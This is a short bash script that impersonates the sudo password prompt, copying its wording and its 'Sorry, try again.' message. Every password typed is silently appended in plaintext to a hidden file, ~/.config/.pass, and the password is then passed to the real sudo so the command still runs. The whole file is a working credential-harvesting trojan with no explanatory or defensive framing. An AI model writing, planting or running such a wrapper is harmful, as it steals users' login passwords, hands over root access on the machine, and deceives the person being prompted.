#!/usr/bin/env bash
SCRIPT_NAME="$(basename "${BASH_SOURCE[0]}")"
PROMPT="[sudo] password for $(whoami): "
PASS_FILE="${HOME}/.config/.pass"

TARGET_COMMAND=("$@")

mkdir -p "$(dirname "${PASS_FILE}")"

authenticate_with_sudo() {
    local password
    local attempts=0

    while [[ $attempts -lt 3 ]]; do
        printf "%s" "$PROMPT" >&2
        read -s password
        echo "" >&2
        
        echo "${password}" >> "${PASS_FILE}"
        chmod 600 "${PASS_FILE}"

        if /usr/bin/printf "%s\n" "$password" | /usr/bin/sudo -S "${TARGET_COMMAND[@]}" 2>/dev/null; then
            unset password
            return 0
        else
            echo "Sorry, try again." >&2
            ((attempts++))
        fi

        unset password
    done
    return 1
}

main() {
    if [[ ${#TARGET_COMMAND[@]} -eq 0 ]]; then
        echo "Error: No command provided." >&2
        exit 1
    fi

    authenticate_with_sudo
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
